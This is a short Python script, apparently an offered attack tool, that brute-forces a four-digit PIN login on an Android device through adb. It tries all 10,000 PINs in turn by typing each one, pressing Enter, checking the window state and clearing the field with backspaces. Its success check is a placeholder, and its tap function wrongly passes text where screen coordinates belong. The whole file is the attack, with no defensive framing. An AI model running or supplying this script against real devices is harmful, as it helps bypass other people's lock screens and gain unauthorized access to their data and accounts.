import subprocess
import time

def send_keyevent(keycode):
    subprocess.run(['adb', 'shell', 'input', 'keyevent', str(keycode)])

def send_text(text):
    subprocess.run(['adb', 'shell', 'input', 'text', text])

def click_button(button_text):
    subprocess.run(['adb', 'shell', 'input', 'tap', button_text])

def check_success():
    # Implement a method to check if login was successful
    # This can be done by checking the app's current activity or UI state
    output = subprocess.run(['adb', 'shell', 'dumpsys', 'window', 'windows'], capture_output=True, text=True)
    if "DesiredSuccessIndicator" in output.stdout:  # Replace with actual success indicator
        return True
    return False

def brute_force_login():
    for number in range(10000):
        pin = f"{number:04d}"  # Format number as 4-digit string
        print(f"Trying PIN: {pin}")
        send_text(pin)
        time.sleep(0.5)  # Wait for the input to be registered (adjust as needed)
        send_keyevent(66)  # Press Enter key to submit the form (keycode 66)
        time.sleep(1)  # Wait for the response (adjust as needed)
        
        if check_success():
            print(f"Success! The PIN is: {pin}")
            break
        
        # Clear the input field if necessary
        # You might need to add code to clear the input field depending on the app's behavior
        send_keyevent(67)  # Keycode for backspace to clear the text
        send_keyevent(67)
        send_keyevent(67)
        send_keyevent(67)


if __name__ == "__main__":
    brute_force_login()

